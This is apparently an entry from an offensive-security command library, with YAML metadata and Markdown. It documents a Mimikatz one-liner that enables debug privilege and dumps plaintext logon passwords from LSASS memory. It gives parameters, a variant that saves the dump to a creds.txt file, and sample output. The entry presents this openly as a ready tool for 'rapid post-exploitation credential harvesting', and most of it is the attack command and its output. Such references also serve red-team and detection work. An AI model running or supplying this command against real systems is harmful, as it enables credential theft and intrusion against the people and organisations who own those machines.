---
id: b6423143-a7a8-4c60-994e-cc7457bbeb8f
name: mimikatz-one-liner-password-extraction
type: command
executor: powershell
data: >-
  PS C:\temp\mimikatz> .\mimikatz.exe "privilege::debug"
  "sekurlsa::logonpasswords" exit
output: null
created_at: '2023-04-06T03:56:27.080190+00:00'
updated_at: '2023-04-10T20:37:17.351681+00:00'
platforms:
  - Windows
tags:
  - credential-access
  - mimikatz
verified: true
validated: true
---

# mimikatz-one-liner-password-extraction

## Command

```powershell
PS C:\temp\mimikatz> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

## Description

This one-liner invokes Mimikatz to quickly elevate privileges and dump logon passwords from memory without an interactive session. Ideal for scripted or rapid post-exploitation credential harvesting.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| .\mimikatz.exe | Path to Mimikatz executable | Yes |
| "privilege::debug" | Enables debug mode for credential access | Yes |
| "sekurlsa::logonpasswords" | Extracts logon passwords from LSASS | Yes |
| exit | Terminates the session | Yes |

## Examples

### Basic Usage

Execute directly in elevated PowerShell for immediate output.

### Advanced Usage

Pipe output to file: `.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > creds.txt`

## Expected Output

Output similar to interactive dump, e.g.:

```
.#####.   mimikatz RPC interface
.## ^ ##.  "A La Vie, la Mort, le Hack" !*
.#####.   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
.v1.1.0.0 64 bits built on Mar 13 2023 15:42:35 (.NET 4.0.30319; WOW64)

Privilege '20' OK
[*] Credentials
... (credential details with plaintext passwords)
```

Success if 'Privilege '20' OK' appears and credentials are listed.

## Related

- [[procedures/Windows-Mimikatz-Password-Extraction]]
- [[tools/Mimikatz]]
